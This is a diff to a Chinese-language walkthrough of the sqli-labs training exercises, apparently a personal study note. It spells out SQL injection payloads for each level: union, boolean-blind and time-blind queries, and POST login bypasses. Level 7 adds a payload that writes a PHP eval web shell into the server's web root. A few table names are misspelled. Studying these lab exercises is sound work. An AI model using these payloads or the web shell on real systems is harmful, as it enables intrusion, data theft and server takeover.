@@ -13,7 +13,7 @@
 5. 将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面是否有显示位。
     `http://192.168.3.148/Less-1/?id=1111%27%20union%20select%201,2,3%20--+`
 
-    首先解释一下select后面几个数字的意思，1，2，3，4...，这里的几个数字纯粹是凑数的，凑够和union关键字前面的那个表的字段数一样，不然没法拼接成一个表。在sql注入的时候，在将相应位置替换成你想获得的数据，查询结果后面就会显示出来。如下图最后一行：
+    首先解释一下select后面几个数字的意思，1，2，3，4...，这里的几个数字纯粹是凑数的，凑够和union关键字前面的那个表的字段数一样，不然没法拼接成一个表。在sql注入的时候，在将相应位置替换成你想获得的数据，查询结果后面就会显示出来。如下图最后一行：  
     ![xx](https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/18d8bc3eb13533fad032f376a0d3fd1f40345be5.jpg)
 
 6. 然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息例子(这是一个查询数据库名信息的语句)：  
@@ -40,21 +40,24 @@
 
 ## 第三关
 
-1. 这里考察的的闭合问题，这里是`')`这样的闭合，所以使用后面的语句进程注入即可。`http://192.168.3.148/Less-3/?id=13333') order by 3 --+`
+1. 这里考察的的闭合问题，这里是`')`这样的闭合，所以使用后面的语句进程注入即可。  
+`http://192.168.3.148/Less-3/?id=13333') order by 3 --+`
 
 ## 第四关
 
-1. 这里考察的也是闭合问题，这里是这种`")`,所以使用后面这样的语句来进行手工注入。`http://192.168.3.148/Less-4/?id=33333") union select 1,2,3 --+`
+1. 这里考察的也是闭合问题，这里是这种`")`,所以使用后面这样的语句来进行手工注入。  
+`http://192.168.3.148/Less-4/?id=33333") union select 1,2,3 --+`
 
 ## 第五关
 
-1. 这关考察布尔型盲注  
+1. 这关可以使用布尔型盲注来获得结果  
    获取数据库长度的语句 `http://192.168.3.148/Less-5/?id=1' and length(database())=10 --+`  
    依次获取数据库每个字符的语句`http://192.168.3.148/Less-5/?id=1' and ord(mid(database(),1,1))=111 --+`
 
     判断表存不存在  `and exists(select * from information_schema.tables)`  
     判断存在多少个库  `and (select count(distinct+table_schema) from information_schema.tables)=4`  
-    查询所有数据库
+
+    查询所有数据库  
     判断数据库名的长度  `and (select length(table_schema) from information_schema.tables limit 0,1) =17`  
     查询每个库的库名  `and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1),1,1)))>104`  
     查询表，先判断表的长度  `and (select length(table_name) from information_schema.tables where table_schema='information_schema' limit 0,1) >13`  
@@ -62,6 +65,7 @@
     猜解表中有多少列 `and (select count(column_name) from information_schema.columns where table_schema='information_schema' and table_name='CHARACTER_SETS' ) >4`  
     判断每个字段的长度  `and (select length(column_name) from information_schema.columns where table_schema='information_schema' and table_name='CHARACTER_SETS' limit 0,1 ) >17`  
     猜第一个字段的字符  `and (select ascii(substr((select column_name from information_schema.columns where table_schema='information_schema' and table_name='CHARACTER_SETS' limit 0,1),1,1)) ) >66`  
+    也可以这么查数据库名  `uname=' )or  (select substr((select database()),1,1))='s'`  
 
     查询当前数据库  
     查询数据库的长度  `and length(database()) > 4`  
@@ -87,6 +91,68 @@
 ## 第六关
 
 1. 使用语句与第五关相同，闭合如后所示  `http://192.168.3.148/Less-6/?id=1" and length(database()) = 555 --+`
+
+## 第七关
+
+1. 使用盲注语句即可，闭合如后  `http://192.168.3.148/Less-7/?id=1 ')) and exists(select * from inforation_schema.tables) --+`  
+向数据库中写入文件的语句  `?id=-1'))  union select 1,"<?php @eval($_POST['chopper']);?>",3 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\123456.php" --+`
+
+## 第八关
+
+1. 使用布尔盲注即可  `http://192.168.3.148/Less-8/?id=1' and exists(select * from infmation_schema.tables) --+`
+
+## 第九关
+
+1. 使用时间盲注  `http://192.168.3.148/Less-9/?id=1' and sleep(5) --+`
+
+## 第十关
+
+1. 使用时间盲注  `http://192.168.3.148/Less-10/?id=1" and sleep(5) --+`
+
+## 第十一关
+
+1. username字段的普通注入，在该字段插入如后的语句都可成果登陆。`'or''='`or`' or 1=1 #`,本质上相同。
+2. 确认注入点后，即可用如后的语句在post数据包中进行注入。`uname=adminsss' order by 2  --+&passwd=123456&submit=Submit`
+
+    ```txt
+    猜测为：
+    select * from users where username='$name' and password='$password'
+    闭合：
+    select * from users where username='  'or  1=1 #  ' and password='$password'
+    ```
+
+## 第十二关
+
+1. 和上关相同，闭合语句变为 `uname=admssssin") order by 2  --+&passwd=123456&submit=Submit`
+
+## 第十三关
+
+1. 注入点同上，但无回显，使用盲注即可  `uname=admin')  and sleep(5)  --+&passwd=123456&submit=Submit`
+
+## 第十四关
+
+1. 注入点同上，使用盲注即可  `uname=admin" and sleep(5)  --+&passwd=123456&submit=Submit`
+
+## 第十五关
+
+1. 使用如后所示语句进行注入  `uname=admin' and sleep(5) #&passwd=123456&submit=Submit`  
+`uname=admin' and sleep(5) -- &passwd=123456&submit=Submit`  
+    > 注意mysql的两种注释方式  
+第一种：使用`#`进行注释  
+第二种：使用`--` 注意：这里在--的后面有一个空格
+
+## 第十六关
+
+1. 使用如后的盲注语句即可进行注入  `uname=admin") and sleep(5) # &passwd=123456&submit=Submit`
+
+## 第十七关
+
+这是在更新密码处发生的注入，实际更新密码的语句如下。
+> update users set password=xxx where username=xxx  
+
+在本关中，因为username有过滤，因此在passwd处进行注入。但是这里有一个问题，在使用延时注入时,返回时间很长，猜测应该是注入语句插入后，注释了where子句的条件规则，因此会所有的user字段做一次查询，即延时设置的时间乘以user的个数，就是最终等待的时间。而且如果真的存在注入的话，这一下很可能就会重置所有用户的密码，实际环境中慎重啊慎重，真是丢饭碗的漏洞。
+
+1. 注入语句如后  `uname=admin&passwd=1234567' and exists(select * from information_schema.tables)#&submit=Submit`
 
 ## 感谢以下博文的原作者。
 
